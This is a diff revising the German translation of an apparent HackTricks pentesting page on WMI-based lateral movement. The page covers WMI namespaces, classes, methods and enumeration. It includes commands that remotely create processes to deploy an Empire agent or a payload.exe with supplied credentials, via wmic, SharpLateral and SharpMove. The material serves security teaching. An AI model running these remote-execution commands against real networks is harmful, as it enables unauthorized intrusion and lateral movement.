@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Wie es funktioniert
+## Erklärung der Funktionsweise
 
-Prozesse können auf Hosts geöffnet werden, bei denen der Benutzername und entweder das Passwort oder der Hash bekannt sind, durch die Verwendung von WMI. Befehle werden mit WMI durch Wmiexec ausgeführt, was eine semi-interaktive Shell-Erfahrung bietet.
+Prozesse können auf Hosts geöffnet werden, wenn der Benutzername sowie entweder das Passwort oder der Hash bekannt sind. Dies erfolgt mithilfe von WMI. Befehle werden von Wmiexec über WMI ausgeführt und bieten eine semi-interaktive Shell-Erfahrung.
 
-**dcomexec.py:** Durch die Nutzung verschiedener DCOM-Endpunkte bietet dieses Skript eine semi-interaktive Shell ähnlich wie wmiexec.py, wobei speziell das ShellBrowserWindow DCOM-Objekt verwendet wird. Es unterstützt derzeit MMC20. Anwendungs-, Shell-Fenster- und Shell-Browser-Fensterobjekte. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Mithilfe verschiedener DCOM-Endpunkte bietet dieses Script eine semi-interaktive Shell ähnlich wie wmiexec.py und nutzt dabei speziell das ShellBrowserWindow-DCOM-Objekt. Derzeit werden MMC20. Application-, Shell Windows- und Shell Browser Window-Objekte unterstützt. (Quelle: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>
 
 ## WMI-Grundlagen
 
 ### Namespace
 
-Strukturiert in einer hierarchischen Verzeichnisstruktur ist WMI's oberster Container \root, unter dem zusätzliche Verzeichnisse, die als Namespaces bezeichnet werden, organisiert sind.  
+WMI ist in einer Verzeichnishierarchie strukturiert. Der Container der obersten Ebene ist \root, unter dem zusätzliche Verzeichnisse organisiert sind, die als Namespaces bezeichnet werden.<sup>[[1]](#references)</sup>
 Befehle zum Auflisten von Namespaces:
 ```bash
 # Retrieval of Root namespaces
@@ -24,14 +24,14 @@ Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | s
 # Listing of namespaces within "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
-Klassen innerhalb eines Namensraums können aufgelistet werden mit:
+Klassen innerhalb eines Namespace können mit Folgendem aufgelistet werden:
 ```bash
 gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **Klassen**
 
-Das Wissen um einen WMI-Klassennamen, wie z.B. win32_process, und den Namespace, in dem er sich befindet, ist entscheidend für jede WMI-Operation.  
+Den Namen einer WMI-Klasse, beispielsweise `win32_process`, sowie den Namespace, in dem sie sich befindet, zu kennen, ist für jede WMI-Operation entscheidend.  
 Befehle zum Auflisten von Klassen, die mit `win32` beginnen:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
@@ -45,7 +45,7 @@ Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpCompute
 ```
 ### Methoden
 
-Methoden, die eine oder mehrere ausführbare Funktionen von WMI-Klassen sind, können ausgeführt werden.
+Methoden, bei denen es sich um eine oder mehrere ausführbare Funktionen von WMI-Klassen handelt, können ausgeführt werden.
 ```bash
 # Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
@@ -76,7 +76,7 @@ Sammeln von System- und Prozessinformationen über WMI:
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
 ```
-Für Angreifer ist WMI ein leistungsstarkes Werkzeug zur Auflistung sensibler Daten über Systeme oder Domänen.
+Für Angreifer ist WMI ein leistungsfähiges Tool zur Aufzählung sensibler Daten über Systeme oder Domänen.<sup>[[1]](#references)</sup>
 ```bash
 wmic computerystem list full /format:list
 wmic process list /format:list
@@ -85,19 +85,19 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-Remote-Abfragen von WMI nach spezifischen Informationen, wie lokalen Administratoren oder angemeldeten Benutzern, sind mit sorgfältiger Befehlskonstruktion machbar.
+Remote-Abfragen von WMI nach bestimmten Informationen, beispielsweise lokalen Administratoren oder angemeldeten Benutzern, sind bei sorgfältiger Erstellung der Befehle möglich.
 
 ### **Manuelle Remote-WMI-Abfragen**
 
-Die heimliche Identifizierung von lokalen Administratoren auf einem Remote-Computer und angemeldeten Benutzern kann durch spezifische WMI-Abfragen erreicht werden. `wmic` unterstützt auch das Lesen aus einer Textdatei, um Befehle gleichzeitig auf mehreren Knoten auszuführen.
+Eine unauffällige Identifizierung lokaler Administratoren auf einem Remote-Rechner und angemeldeter Benutzer kann durch spezifische WMI-Abfragen erreicht werden. `wmic` unterstützt auch das Lesen aus einer Textdatei, um Befehle gleichzeitig auf mehreren Knoten auszuführen.<sup>[[1]](#references)</sup>
 
-Um einen Prozess über WMI remote auszuführen, wie das Bereitstellen eines Empire-Agenten, wird die folgende Befehlsstruktur verwendet, wobei eine erfolgreiche Ausführung durch einen Rückgabewert von "0" angezeigt wird:
+Um einen Prozess remote über WMI auszuführen, beispielsweise zum Bereitstellen eines Empire-Agenten, wird die folgende Befehlsstruktur verwendet. Eine erfolgreiche Ausführung wird durch den Rückgabewert „0“ angezeigt:<sup>[[1]](#references)</sup>
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Dieser Prozess veranschaulicht die Fähigkeit von WMI zur Remote-Ausführung und Systemenumeration und hebt seinen Nutzen sowohl für die Systemadministration als auch für das Pentesting hervor.
+Dieser Prozess veranschaulicht die Fähigkeit von WMI zur Remote-Ausführung und Systemaufzählung und hebt seine Nützlichkeit sowohl für die Systemadministration als auch für pentesting hervor.
 
-## Automatische Werkzeuge
+## Automatische Tools
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
@@ -115,12 +115,13 @@ SharpMove.exe action=query computername=remote.host.local query="select * from w
 SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
-- Sie könnten auch **Impacket's `wmiexec`** verwenden.
+- Du könntest auch **Impackets `wmiexec`** verwenden.
 
 
 ## Referenzen
 
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+- [1] [Mit Credentials Windows-Rechner übernehmen – Teil 3 (WMI und WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
+- [2] [Anfängerleitfaden für das Impacket Tool Kit – Teil 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
 
 
 {{#include ../../banners/hacktricks-training.md}}
